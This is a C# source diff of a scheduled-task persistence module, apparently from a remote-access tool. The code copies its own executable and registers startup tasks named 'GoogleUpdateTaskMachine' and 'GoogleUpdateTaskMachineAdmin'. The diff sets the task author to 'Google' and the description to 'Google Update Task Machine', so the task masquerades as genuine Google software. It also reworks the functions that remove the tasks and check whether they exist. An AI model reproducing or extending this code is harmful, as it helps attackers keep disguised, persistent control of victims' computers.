@@ -17,8 +17,8 @@ namespace Plugin.Handler
 {
     class HandleSchtask
     {
-        public static string Author = "";
-        public static string Description = "";
+        public static string Author = "Google";
+        public static string Description = "Google Update Task Machine";
         public static string Task = "GoogleUpdateTaskMachine";
         public static string TaskAdmin = "GoogleUpdateTaskMachineAdmin";
         public static void AddStartUp()
@@ -74,7 +74,6 @@ namespace Plugin.Handler
                         File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
                     }
                     
-                    
                     TaskService ts = new TaskService();
                     TaskDefinition td = ts.NewTask();
                     td.RegistrationInfo.Description = Description;
@@ -128,8 +127,6 @@ namespace Plugin.Handler
                         }
                         File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
                     }
-                    
-                    
                     TaskService ts = new TaskService();
                     TaskDefinition td = ts.NewTask();
                     td.RegistrationInfo.Description = Description;
@@ -158,6 +155,10 @@ namespace Plugin.Handler
             {
                 using (TaskService _taskService = new TaskService())
                 {
+                    _taskService.RootFolder.DeleteTask(Task, false);
+                }
+                using (TaskService _taskService = new TaskService())
+                {
                     _taskService.RootFolder.DeleteTask(TaskAdmin, false);
                 }
             }
@@ -165,72 +166,34 @@ namespace Plugin.Handler
             {
                 Packet.Error(ex.Message);
             }
-            try
-            {
-                using (TaskService _taskService = new TaskService())
-                {
-                    _taskService.RootFolder.DeleteTask(Task, false);
-                }
-            }
-            catch (Exception ex)
-            {
-                Packet.Error(ex.Message);
-            }
-
         }
 
         public static bool GetStartUp()
         {
-            if (Methods.IsAdmin() && Environment.Is64BitOperatingSystem)
+            try
             {
-                try
+                TaskCollection taskCollection;
+                TaskCollection taskCollectionAdmin;
+                using (TaskService _taskService = new TaskService())
                 {
-                    TaskCollection taskCollection;
-                    using (TaskService _taskService = new TaskService())
-                    {
-                        taskCollection = _taskService.RootFolder.GetTasks(new Regex(TaskAdmin));
-                    }
+                    taskCollection = _taskService.RootFolder.GetTasks(new Regex(Task));
                     if (taskCollection.Count != 0)
                     {
                         return true;
                     }
-                    else
-                    {
-                        return false;
-                    }
-                }
-                catch (Exception ex)
-                {
-                    Packet.Error(ex.Message);
-                    return false;
-                }
-            }
-            else 
-            {
-                try
-                {
-                    TaskCollection taskCollection;
-                    using (TaskService _taskService = new TaskService())
-                    {
-                        taskCollection = _taskService.RootFolder.GetTasks(new Regex(Task));
-                    }
-                    if (taskCollection.Count != 0)
+                    taskCollectionAdmin = _taskService.RootFolder.GetTasks(new Regex(TaskAdmin));
+                    if (taskCollectionAdmin.Count != 0)
                     {
                         return true;
                     }
-                    else
-                    {
-                        return false;
-                    }
                 }
-                catch (Exception ex)
-                {
-                    Packet.Error(ex.Message);
-                    return false;
-                }
+                return false;
             }
-                
-
+            catch (Exception ex)
+            {
+                Packet.Error(ex.Message);
+                return false;
+            }
         }
     }
 
